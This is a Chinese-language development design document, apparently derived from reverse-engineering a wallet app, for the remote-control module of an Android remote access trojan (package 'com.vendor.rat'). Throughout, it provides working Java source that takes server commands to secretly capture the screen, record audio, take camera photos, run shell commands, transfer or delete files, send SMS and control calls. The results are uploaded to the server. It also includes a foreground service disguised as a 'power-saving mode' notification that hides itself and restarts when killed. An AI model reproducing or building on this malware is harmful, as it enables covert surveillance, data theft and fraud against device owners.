# 模块 06：远程控制模块设计文档

> **模块名称**: Remote Control Module
> **优先级**: P1（高）
> **依赖**: 模块 01（网络通信模块）、模块 05（数据收集模块）
> **版本**: 1.0
> **日期**: 2026-03-17

---

## 一、模块概述

### 1.1 功能描述

远程控制模块接收服务端通过 WebSocket 下发的控制指令，执行截图、录音、Shell 命令、文件管理、摄像头拍照等操作，并将结果回传至服务端。

### 1.2 核心能力

- ✅ 屏幕截图（MediaProjection API）
- ✅ 录音控制（MediaRecorder + MIC）
- ✅ Shell 命令执行（Runtime.exec）
- ✅ 文件上传/下载管理
- ✅ 摄像头拍照（CameraManager）
- ✅ 短信发送（SmsManager）
- ✅ 通话控制（TelecomManager）
- ✅ 指令调度与结果回传

---

## 二、架构设计

```
┌─────────────────────────────────────────────────────────┐
│              WebSocketClient (模块 01)                   │
│  接收服务端下发的控制指令                                  │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│              CommandDispatcher (指令分发器)               │
│  - 解析指令类型                                          │
│  - 路由到对应 Handler                                    │
│  - 管理指令生命周期                                       │
└─────────────────────────────────────────────────────────┘
        ↓           ↓           ↓           ↓
┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐
│Screenshot│ │ Audio    │ │  Shell   │ │  File    │
│ Handler  │ │ Handler  │ │ Handler  │ │ Handler  │
└──────────┘ └──────────┘ └──────────┘ └──────────┘
        ↓           ↓           ↓           ↓
┌─────────────────────────────────────────────────────────┐
│              CommandResult (结果回传)                     │
│  - 通过 WebSocket 回传结果                                │
│  - 文件通过 HTTP 上传                                     │
└─────────────────────────────────────────────────────────┘
```

### 2.1 包结构

```
com.vendor.rat.control
├── CommandDispatcher.java          # 指令分发器
├── CommandResult.java              # 指令结果封装
├── CommandType.java                # 指令类型枚举
├── handler/
│   ├── CommandHandler.java         # Handler 接口
│   ├── ScreenshotHandler.java      # 截图处理器
│   ├── AudioRecordHandler.java     # 录音处理器
│   ├── ShellCommandHandler.java    # Shell 命令处理器
│   ├── FileTransferHandler.java    # 文件传输处理器
│   ├── CameraHandler.java         # 摄像头处理器
│   ├── SmsCommandHandler.java     # 短信发送处理器
│   └── CallCommandHandler.java    # 通话控制处理器
└── service/
    └── MediaLiveService.java       # 前台媒体服务（截图+录音）
```

---

## 三、指令协议

### 3.1 WebSocket 指令格式

**基于**: `com/guard/wallet/bridge/a.java`

```
服务端 → 设备:
{
    "type": <command_type>,
    "commandId": "cmd_xxxxxx",
    "body": {
        "bridgePath": "/cacheTask",
        "toDesktop": true,
        "buffer": "<base64_encoded_params>"
    }
}

设备 → 服务端 (响应):
{
    "type": 16,
    "body": {
        "commandId": "cmd_xxxxxx",
        "success": true,
        "data": "<result_data>"
    }
}
```

### 3.2 指令类型

```java
package com.vendor.rat.control;

public enum CommandType {

    SCREENSHOT(10, "截图"),
    RECORD_AUDIO(11, "录音"),
    DOWNLOAD_FILE(12, "下载文件"),
    UPLOAD_FILE(13, "上传文件"),
    EXECUTE_SHELL(14, "执行Shell"),
    SEND_SMS(15, "发送短信"),
    RESPONSE(16, "响应消息"),
    TAKE_PHOTO(17, "拍照"),
    START_CALL(18, "拨打电话"),
    GET_LOCATION(19, "获取位置"),
    GET_APP_LIST(20, "获取应用列表");

    private final int code;
    private final String description;

    CommandType(int code, String description) {
        this.code = code;
        this.description = description;
    }

    public int getCode() { return code; }

    public static CommandType fromCode(int code) {
        for (CommandType type : values()) {
            if (type.code == code) return type;
        }
        return null;
    }
}
```

---

## 四、指令分发器

### 4.1 CommandDispatcher

```java
package com.vendor.rat.control;

public class CommandDispatcher {

    private final Map<CommandType, CommandHandler> handlers = new HashMap<>();
    private final ExecutorService executor;

    public CommandDispatcher() {
        executor = Executors.newFixedThreadPool(3);
        registerHandlers();
    }

    private void registerHandlers() {
        handlers.put(CommandType.SCREENSHOT, new ScreenshotHandler());
        handlers.put(CommandType.RECORD_AUDIO, new AudioRecordHandler());
        handlers.put(CommandType.EXECUTE_SHELL, new ShellCommandHandler());
        handlers.put(CommandType.DOWNLOAD_FILE, new FileTransferHandler());
        handlers.put(CommandType.UPLOAD_FILE, new FileTransferHandler());
        handlers.put(CommandType.TAKE_PHOTO, new CameraHandler());
        handlers.put(CommandType.SEND_SMS, new SmsCommandHandler());
        handlers.put(CommandType.START_CALL, new CallCommandHandler());
    }

    /**
     * 分发指令（WebSocket 消息回调中调用）
     */
    public void dispatch(String rawMessage) {
        executor.submit(() -> {
            try {
                JsonObject json = JsonParser.parseString(rawMessage)
                    .getAsJsonObject();
                int typeCode = json.get("type").getAsInt();
                String commandId = json.getAsJsonObject("body")
                    .get("commandId").getAsString();
                String buffer = json.getAsJsonObject("body")
                    .get("buffer").getAsString();

                CommandType type = CommandType.fromCode(typeCode);
                if (type == null) {
                    sendError(commandId, "Unknown command type: " + typeCode);
                    return;
                }

                CommandHandler handler = handlers.get(type);
                if (handler == null) {
                    sendError(commandId, "No handler for: " + type);
                    return;
                }

                // 解码参数
                String params = new String(
                    Base64.decode(buffer, Base64.URL_SAFE)
                );

                // 执行指令
                CommandResult result = handler.execute(commandId, params);

                // 回传结果
                sendResult(result);

            } catch (Exception e) {
                Log.e("CommandDispatcher", "Dispatch error", e);
            }
        });
    }

    private void sendResult(CommandResult result) {
        JsonObject response = new JsonObject();
        response.addProperty("type", CommandType.RESPONSE.getCode());

        JsonObject body = new JsonObject();
        body.addProperty("commandId", result.getCommandId());
        body.addProperty("success", result.isSuccess());
        body.addProperty("data", result.getData());
        response.add("body", body);

        NetworkManager.getInstance().getWebSocketClient()
            .send(response.toString());
    }

    private void sendError(String commandId, String error) {
        CommandResult result = new CommandResult(commandId, false, error);
        sendResult(result);
    }
}
```

### 4.2 CommandHandler 接口

```java
package com.vendor.rat.control.handler;

public interface CommandHandler {

    /**
     * 执行指令
     * @param commandId 指令唯一标识
     * @param params JSON 格式参数
     * @return 执行结果
     */
    CommandResult execute(String commandId, String params);
}
```

### 4.3 CommandResult

```java
package com.vendor.rat.control;

public class CommandResult {

    private final String commandId;
    private final boolean success;
    private final String data;

    public CommandResult(String commandId, boolean success, String data) {
        this.commandId = commandId;
        this.success = success;
        this.data = data;
    }

    public String getCommandId() { return commandId; }
    public boolean isSuccess() { return success; }
    public String getData() { return data; }
}
```

---

## 五、屏幕截图

### 5.1 ScreenshotHandler

**基于**: `com/guard/wallet/service/MediaLiveService.java`

```java
package com.vendor.rat.control.handler;

public class ScreenshotHandler implements CommandHandler {

    private Context context;
    private MediaProjection mediaProjection;
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;

    @Override
    public CommandResult execute(String commandId, String params) {
        try {
            // MediaProjection 需要通过 Activity 获取权限
            // 通常在首次启动时获取，保存 resultCode 和 data
            if (mediaProjection == null) {
                return new CommandResult(commandId, false,
                    "MediaProjection not initialized");
            }

            byte[] screenshotData = captureScreen();

            if (screenshotData != null) {
                // 通过 HTTP 上传截图文件
                NetworkManager.getInstance().getHttpClient()
                    .uploadBytes(
                        ApiEndpoints.SCREENSHOT_UPLOAD,
                        screenshotData,
                        "screenshot_" + System.currentTimeMillis() + ".jpg"
                    );

                return new CommandResult(commandId, true, "Screenshot captured");
            }

            return new CommandResult(commandId, false, "Capture failed");

        } catch (Exception e) {
            return new CommandResult(commandId, false, e.getMessage());
        }
    }

    /**
     * 初始化 MediaProjection（Activity 授权后调用）
     */
    public void initProjection(int resultCode, Intent data, Context context) {
        this.context = context;

        MediaProjectionManager manager = (MediaProjectionManager)
            context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        mediaProjection = manager.getMediaProjection(resultCode, data);

        // 获取屏幕参数
        DisplayMetrics metrics = context.getResources().getDisplayMetrics();
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int density = metrics.densityDpi;

        // 创建 ImageReader
        imageReader = ImageReader.newInstance(width, height,
            PixelFormat.RGBA_8888, 2);

        // 创建 VirtualDisplay
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "ScreenCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.getSurface(),
            null, null
        );
    }

    /**
     * 捕获当前屏幕
     */
    private byte[] captureScreen() {
        if (imageReader == null) return null;

        Image image = imageReader.acquireLatestImage();
        if (image == null) return null;

        try {
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * image.getWidth();

            // 创建 Bitmap
            Bitmap bitmap = Bitmap.createBitmap(
                image.getWidth() + rowPadding / pixelStride,
                image.getHeight(),
                Bitmap.Config.ARGB_8888
            );
            bitmap.copyPixelsFromBuffer(buffer);

            // 裁剪多余部分
            bitmap = Bitmap.createBitmap(bitmap, 0, 0,
                image.getWidth(), image.getHeight());

            // 压缩为 JPEG
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
            bitmap.recycle();

            return baos.toByteArray();

        } finally {
            image.close();
        }
    }

    public void release() {
        if (virtualDisplay != null) {
            virtualDisplay.release();
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
        if (imageReader != null) {
            imageReader.close();
        }
    }
}
```

### 5.2 API 接口

```
POST /api/shotFile/batch.json

Content-Type: multipart/form-data
- deviceId: 设备标识
- file: JPEG 图片数据
- fileName: screenshot_1710000000000.jpg
```

---

## 六、录音控制

### 6.1 AudioRecordHandler

**基于**: `com/guard/wallet/service/MediaRecordingService.java`

```java
package com.vendor.rat.control.handler;

public class AudioRecordHandler implements CommandHandler {

    private MediaRecorder recorder;
    private File audioFile;
    private volatile boolean isRecording = false;

    @Override
    public CommandResult execute(String commandId, String params) {
        try {
            JsonObject paramJson = JsonParser.parseString(params)
                .getAsJsonObject();
            String action = paramJson.get("action").getAsString();

            switch (action) {
                case "start":
                    int duration = paramJson.has("duration")
                        ? paramJson.get("duration").getAsInt()
                        : 60; // 默认 60 秒
                    return startRecording(commandId, duration);

                case "stop":
                    return stopRecording(commandId);

                default:
                    return new CommandResult(commandId, false,
                        "Unknown action: " + action);
            }

        } catch (Exception e) {
            return new CommandResult(commandId, false, e.getMessage());
        }
    }

    private CommandResult startRecording(String commandId, int durationSec) {
        if (isRecording) {
            return new CommandResult(commandId, false, "Already recording");
        }

        try {
            audioFile = createAudioFile();

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioChannels(1);           // 单声道
            recorder.setAudioSamplingRate(44100);    // 44.1kHz
            recorder.setAudioEncodingBitRate(96000); // 96kbps
            recorder.setOutputFile(audioFile.getAbsolutePath());

            recorder.prepare();
            recorder.start();
            isRecording = true;

            // 定时停止
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                stopAndUpload(commandId);
            }, durationSec * 1000L);

            return new CommandResult(commandId, true,
                "Recording started, duration: " + durationSec + "s");

        } catch (Exception e) {
            return new CommandResult(commandId, false,
                "Start recording failed: " + e.getMessage());
        }
    }

    private CommandResult stopRecording(String commandId) {
        return stopAndUpload(commandId);
    }

    private synchronized CommandResult stopAndUpload(String commandId) {
        if (!isRecording || recorder == null) {
            return new CommandResult(commandId, false, "Not recording");
        }

        try {
            recorder.stop();
            recorder.release();
            recorder = null;
            isRecording = false;

            // 上传录音文件
            if (audioFile != null && audioFile.exists()) {
                NetworkManager.getInstance().getHttpClient()
                    .uploadFile(ApiEndpoints.AUDIO_UPLOAD, audioFile);

                long fileSize = audioFile.length();
                audioFile.delete(); // 上传后删除本地文件

                return new CommandResult(commandId, true,
                    "Recording uploaded, size: " + fileSize);
            }

            return new CommandResult(commandId, false, "Audio file not found");

        } catch (Exception e) {
            isRecording = false;
            return new CommandResult(commandId, false,
                "Stop recording failed: " + e.getMessage());
        }
    }

    private File createAudioFile() {
        File dir = new File(
            MainApplication.getInstance().getCacheDir(), "audio"
        );
        if (!dir.exists()) dir.mkdirs();

        return new File(dir,
            "rec_" + System.currentTimeMillis() + ".m4a"
        );
    }
}
```

### 6.2 录音参数

| 参数 | 值 | 说明 |
|------|------|------|
| AudioSource | MIC | 麦克风 |
| OutputFormat | MPEG_4 | MP4 容器 |
| AudioEncoder | AAC | AAC 编码 |
| Channels | 1 | 单声道 |
| SamplingRate | 44100 Hz | CD 品质 |
| BitRate | 96000 bps | 96 kbps |
| 文件格式 | .m4a | - |

### 6.3 API 接口

```
POST /api/audioFile/batch.json

Content-Type: multipart/form-data
- deviceId: 设备标识
- file: M4A 音频数据
- fileName: rec_1710000000000.m4a
- duration: 录音时长（秒）
```

---

## 七、Shell 命令执行

### 7.1 ShellCommandHandler

```java
package com.vendor.rat.control.handler;

public class ShellCommandHandler implements CommandHandler {

    private static final int MAX_OUTPUT_SIZE = 64 * 1024; // 64KB
    private static final int COMMAND_TIMEOUT = 30; // 30 秒超时

    @Override
    public CommandResult execute(String commandId, String params) {
        try {
            JsonObject paramJson = JsonParser.parseString(params)
                .getAsJsonObject();
            String command = paramJson.get("command").getAsString();

            // 安全检查：禁止危险命令
            if (isDangerousCommand(command)) {
                return new CommandResult(commandId, false,
                    "Command blocked: " + command);
            }

            String output = executeShell(command);

            return new CommandResult(commandId, true, output);

        } catch (Exception e) {
            return new CommandResult(commandId, false, e.getMessage());
        }
    }

    private String executeShell(String command) throws Exception {
        Process process = Runtime.getRuntime().exec(
            new String[]{"/system/bin/sh", "-c", command}
        );

        // 读取 stdout
        BufferedReader stdReader = new BufferedReader(
            new InputStreamReader(process.getInputStream())
        );

        // 读取 stderr
        BufferedReader errReader = new BufferedReader(
            new InputStreamReader(process.getErrorStream())
        );

        StringBuilder output = new StringBuilder();
        String line;

        while ((line = stdReader.readLine()) != null) {
            output.append(line).append("\n");
            if (output.length() > MAX_OUTPUT_SIZE) {
                output.append("\n... [output truncated]");
                break;
            }
        }

        // 追加错误输出
        StringBuilder errorOutput = new StringBuilder();
        while ((line = errReader.readLine()) != null) {
            errorOutput.append(line).append("\n");
        }

        // 等待进程结束
        boolean finished = process.waitFor(COMMAND_TIMEOUT, TimeUnit.SECONDS);
        if (!finished) {
            process.destroyForcibly();
            output.append("\n[TIMEOUT: command killed after ")
                .append(COMMAND_TIMEOUT).append("s]");
        }

        int exitCode = process.exitValue();
        if (exitCode != 0 && errorOutput.length() > 0) {
            output.append("\n[STDERR]: ").append(errorOutput);
        }

        return output.toString();
    }

    private boolean isDangerousCommand(String command) {
        String[] dangerous = {"rm -rf /", "mkfs", "dd if=", "reboot"};
        String lower = command.toLowerCase();
        for (String d : dangerous) {
            if (lower.contains(d)) return true;
        }
        return false;
    }
}
```

### 7.2 常用命令

| 命令 | 用途 |
|------|------|
| `pm list packages` | 获取已安装包列表 |
| `dumpsys activity services` | 获取运行中的服务 |
| `cat /proc/version` | 获取内核版本 |
| `getprop ro.build.display.id` | 获取系统版本号 |
| `settings get secure android_id` | 获取 Android ID |
| `ip addr show wlan0` | 获取 WiFi IP |

---

## 八、文件传输

### 8.1 FileTransferHandler

```java
package com.vendor.rat.control.handler;

public class FileTransferHandler implements CommandHandler {

    @Override
    public CommandResult execute(String commandId, String params) {
        try {
            JsonObject paramJson = JsonParser.parseString(params)
                .getAsJsonObject();
            String action = paramJson.get("action").getAsString();

            switch (action) {
                case "upload":
                    return handleUpload(commandId, paramJson);

                case "download":
                    return handleDownload(commandId, paramJson);

                case "list":
                    return handleListFiles(commandId, paramJson);

                case "delete":
                    return handleDelete(commandId, paramJson);

                default:
                    return new CommandResult(commandId, false,
                        "Unknown action: " + action);
            }

        } catch (Exception e) {
            return new CommandResult(commandId, false, e.getMessage());
        }
    }

    /**
     * 上传设备文件到服务端
     */
    private CommandResult handleUpload(
            String commandId, JsonObject params) {
        String filePath = params.get("filePath").getAsString();
        File file = new File(filePath);

        if (!file.exists()) {
            return new CommandResult(commandId, false,
                "File not found: " + filePath);
        }

        if (file.length() > 50 * 1024 * 1024) { // 50MB 限制
            return new CommandResult(commandId, false,
                "File too large: " + file.length());
        }

        NetworkManager.getInstance().getHttpClient()
            .uploadFile(ApiEndpoints.FILE_UPLOAD, file);

        return new CommandResult(commandId, true,
            "Uploaded: " + file.getName() + " (" + file.length() + " bytes)");
    }

    /**
     * 从服务端下载文件到设备
     */
    private CommandResult handleDownload(
            String commandId, JsonObject params) {
        String url = params.get("url").getAsString();
        String savePath = params.get("savePath").getAsString();

        NetworkManager.getInstance().getHttpClient()
            .downloadFile(url, new File(savePath));

        return new CommandResult(commandId, true,
            "Downloaded to: " + savePath);
    }

    /**
     * 列出目录文件
     */
    private CommandResult handleListFiles(
            String commandId, JsonObject params) {
        String dirPath = params.get("path").getAsString();
        File dir = new File(dirPath);

        if (!dir.exists() || !dir.isDirectory()) {
            return new CommandResult(commandId, false,
                "Directory not found: " + dirPath);
        }

        File[] files = dir.listFiles();
        if (files == null) {
            return new CommandResult(commandId, true, "[]");
        }

        JsonArray fileArray = new JsonArray();
        for (File file : files) {
            JsonObject fileObj = new JsonObject();
            fileObj.addProperty("name", file.getName());
            fileObj.addProperty("path", file.getAbsolutePath());
            fileObj.addProperty("size", file.length());
            fileObj.addProperty("isDir", file.isDirectory());
            fileObj.addProperty("lastModified", file.lastModified());
            fileArray.add(fileObj);
        }

        return new CommandResult(commandId, true, fileArray.toString());
    }

    /**
     * 删除文件
     */
    private CommandResult handleDelete(
            String commandId, JsonObject params) {
        String filePath = params.get("filePath").getAsString();
        File file = new File(filePath);

        if (!file.exists()) {
            return new CommandResult(commandId, false,
                "File not found: " + filePath);
        }

        boolean deleted = file.delete();
        return new CommandResult(commandId, deleted,
            deleted ? "Deleted" : "Delete failed");
    }
}
```

---

## 九、摄像头拍照

### 9.1 CameraHandler

```java
package com.vendor.rat.control.handler;

public class CameraHandler implements CommandHandler {

    @Override
    public CommandResult execute(String commandId, String params) {
        try {
            JsonObject paramJson = JsonParser.parseString(params)
                .getAsJsonObject();

            // 默认使用后置摄像头
            int facing = paramJson.has("facing")
                ? paramJson.get("facing").getAsInt()
                : CameraCharacteristics.LENS_FACING_BACK;

            byte[] photoData = takePhoto(facing);

            if (photoData != null) {
                NetworkManager.getInstance().getHttpClient()
                    .uploadBytes(
                        ApiEndpoints.PHOTO_UPLOAD,
                        photoData,
                        "camera_" + System.currentTimeMillis() + ".jpg"
                    );

                return new CommandResult(commandId, true,
                    "Photo taken, size: " + photoData.length);
            }

            return new CommandResult(commandId, false, "Take photo failed");

        } catch (Exception e) {
            return new CommandResult(commandId, false, e.getMessage());
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private byte[] takePhoto(int lensFacing) throws Exception {
        Context context = MainApplication.getInstance();
        CameraManager manager = (CameraManager)
            context.getSystemService(Context.CAMERA_SERVICE);

        // 查找目标摄像头
        String cameraId = null;
        for (String id : manager.getCameraIdList()) {
            CameraCharacteristics chars = manager.getCameraCharacteristics(id);
            Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
            if (facing != null && facing == lensFacing) {
                cameraId = id;
                break;
            }
        }

        if (cameraId == null) {
            throw new Exception("Camera not found for facing: " + lensFacing);
        }

        // 使用 ImageReader 获取图片
        CameraCharacteristics chars =
            manager.getCameraCharacteristics(cameraId);
        StreamConfigurationMap map = chars.get(
            CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP
        );

        Size[] sizes = map.getOutputSizes(ImageFormat.JPEG);
        Size optimalSize = sizes[0]; // 最大分辨率

        ImageReader reader = ImageReader.newInstance(
            optimalSize.getWidth(), optimalSize.getHeight(),
            ImageFormat.JPEG, 1
        );

        CountDownLatch latch = new CountDownLatch(1);
        final byte[][] result = new byte[1][];

        reader.setOnImageAvailableListener(imageReader -> {
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                result[0] = new byte[buffer.remaining()];
                buffer.get(result[0]);
                image.close();
            }
            latch.countDown();
        }, null);

        // 打开摄像头拍照（简化流程）
        HandlerThread thread = new HandlerThread("CameraThread");
        thread.start();
        Handler handler = new Handler(thread.getLooper());

        manager.openCamera(cameraId, new CameraDevice.StateCallback() {
            @Override
            public void onOpened(CameraDevice camera) {
                try {
                    CaptureRequest.Builder builder = camera.createCaptureRequest(
                        CameraDevice.TEMPLATE_STILL_CAPTURE
                    );
                    builder.addTarget(reader.getSurface());
                    builder.set(CaptureRequest.CONTROL_MODE,
                        CameraMetadata.CONTROL_MODE_AUTO);

                    camera.createCaptureSession(
                        Collections.singletonList(reader.getSurface()),
                        new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(CameraCaptureSession session) {
                                try {
                                    session.capture(builder.build(), null, handler);
                                } catch (CameraAccessException e) {
                                    latch.countDown();
                                }
                            }
                            @Override
                            public void onConfigureFailed(
                                    CameraCaptureSession session) {
                                latch.countDown();
                            }
                        },
                        handler
                    );
                } catch (CameraAccessException e) {
                    latch.countDown();
                }
            }
            @Override
            public void onDisconnected(CameraDevice camera) {
                camera.close();
                latch.countDown();
            }
            @Override
            public void onError(CameraDevice camera, int error) {
                camera.close();
                latch.countDown();
            }
        }, handler);

        // 等待拍照完成（最多 10 秒）
        latch.await(10, TimeUnit.SECONDS);
        thread.quitSafely();

        return result[0];
    }
}
```

---

## 十、短信发送

### 10.1 SmsCommandHandler

```java
package com.vendor.rat.control.handler;

public class SmsCommandHandler implements CommandHandler {

    @Override
    public CommandResult execute(String commandId, String params) {
        try {
            JsonObject paramJson = JsonParser.parseString(params)
                .getAsJsonObject();

            String phoneNumber = paramJson.get("phone").getAsString();
            String message = paramJson.get("message").getAsString();

            SmsManager smsManager = SmsManager.getDefault();

            // 长短信自动分割
            if (message.length() > 70) {
                ArrayList<String> parts =
                    smsManager.divideMessage(message);
                smsManager.sendMultipartTextMessage(
                    phoneNumber, null, parts, null, null
                );
            } else {
                smsManager.sendTextMessage(
                    phoneNumber, null, message, null, null
                );
            }

            return new CommandResult(commandId, true,
                "SMS sent to: " + phoneNumber);

        } catch (Exception e) {
            return new CommandResult(commandId, false,
                "Send SMS failed: " + e.getMessage());
        }
    }
}
```

---

## 十一、通话控制

### 11.1 CallCommandHandler

```java
package com.vendor.rat.control.handler;

public class CallCommandHandler implements CommandHandler {

    @Override
    public CommandResult execute(String commandId, String params) {
        try {
            JsonObject paramJson = JsonParser.parseString(params)
                .getAsJsonObject();
            String action = paramJson.get("action").getAsString();

            switch (action) {
                case "dial":
                    String number = paramJson.get("phone").getAsString();
                    return dialNumber(commandId, number);

                case "hangup":
                    return hangupCall(commandId);

                default:
                    return new CommandResult(commandId, false,
                        "Unknown action: " + action);
            }

        } catch (Exception e) {
            return new CommandResult(commandId, false, e.getMessage());
        }
    }

    private CommandResult dialNumber(String commandId, String phoneNumber) {
        Context context = MainApplication.getInstance();

        Intent intent = new Intent(Intent.ACTION_CALL);
        intent.setData(Uri.parse("tel:" + phoneNumber));
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        try {
            context.startActivity(intent);
            return new CommandResult(commandId, true,
                "Calling: " + phoneNumber);
        } catch (SecurityException e) {
            return new CommandResult(commandId, false,
                "CALL_PHONE permission not granted");
        }
    }

    private CommandResult hangupCall(String commandId) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                TelecomManager tm = (TelecomManager) MainApplication
                    .getInstance()
                    .getSystemService(Context.TELECOM_SERVICE);
                tm.endCall();
            } else {
                // 旧版本通过反射调用 ITelephony.endCall()
                TelephonyManager tm = (TelephonyManager) MainApplication
                    .getInstance()
                    .getSystemService(Context.TELEPHONY_SERVICE);
                Method method = tm.getClass()
                    .getDeclaredMethod("endCall");
                method.invoke(tm);
            }

            return new CommandResult(commandId, true, "Call ended");

        } catch (Exception e) {
            return new CommandResult(commandId, false,
                "Hangup failed: " + e.getMessage());
        }
    }
}
```

---

## 十二、MediaLiveService（前台服务）

### 12.1 服务实现

**基于**: `com/guard/wallet/service/MediaLiveService.java`

```java
package com.vendor.rat.control.service;

/**
 * 前台媒体服务
 * - 提供截图和录音的 Service 容器
 * - 使用 Foreground Service 防止被系统杀死
 * - 伪装通知标题为"省电模式"
 */
public class MediaLiveService extends Service {

    private static final String CHANNEL_ID = "media_live_100";
    private static final int NOTIFICATION_ID = 100;

    private ScreenshotHandler screenshotHandler;
    private AudioRecordHandler audioRecordHandler;

    @Override
    public void onCreate() {
        super.onCreate();

        // 创建通知渠道（Android 8.0+）
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Background Service",
                NotificationManager.IMPORTANCE_LOW // 低优先级
            );
            channel.setLockscreenVisibility(
                Notification.VISIBILITY_SECRET // 锁屏不显示
            );

            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(channel);
        }

        // 创建前台通知
        Notification notification = new NotificationCompat.Builder(
            this, CHANNEL_ID
        )
            .setContentTitle("standby power-saving mode")
            .setContentText("entered standby power-saving mode")
            .setSmallIcon(android.R.drawable.ic_lock_idle_alarm)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build();

        notification.flags |= Notification.FLAG_NO_CLEAR; // 不可清除

        startForeground(NOTIFICATION_ID, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            int resultCode = intent.getIntExtra("code", -1);
            Intent data = intent.getParcelableExtra("data");

            if (resultCode != -1 && data != null) {
                // 初始化截图功能
                screenshotHandler = new ScreenshotHandler();
                screenshotHandler.initProjection(resultCode, data, this);
            }
        }

        return START_STICKY; // 被杀后自动重启
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (screenshotHandler != null) {
            screenshotHandler.release();
        }
    }
}
```

---

## 十三、所需权限

```xml
<!-- 截图 -->
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />

<!-- 录音 -->
<uses-permission android:name="android.permission.RECORD_AUDIO" />

<!-- 摄像头 -->
<uses-permission android:name="android.permission.CAMERA" />

<!-- 短信发送 -->
<uses-permission android:name="android.permission.SEND_SMS" />

<!-- 通话 -->
<uses-permission android:name="android.permission.CALL_PHONE" />
<uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />

<!-- 文件访问 -->
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />

<!-- 后台运行 -->
<uses-permission android:name="android.permission.WAKE_LOCK" />
<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
```

---

## 十四、工作量估算

| 功能 | 工作量 | 优先级 |
|------|--------|--------|
| 指令分发器 | 1 天 | P0 |
| 屏幕截图 | 2 天 | P0 |
| 录音控制 | 1.5 天 | P0 |
| Shell 命令执行 | 1 天 | P1 |
| 文件传输 | 2 天 | P1 |
| 摄像头拍照 | 2 天 | P1 |
| 短信发送 | 0.5 天 | P2 |
| 通话控制 | 0.5 天 | P2 |
| MediaLiveService | 1.5 天 | P0 |
| **总计** | **12 天** | - |

---

**文档版本**: 1.0
**最后更新**: 2026-03-17
**基于逆向分析**: `com/guard/wallet/bridge/a.java`, `com/guard/wallet/service/MediaLiveService.java`, `com/guard/wallet/service/MediaRecordingService.java`
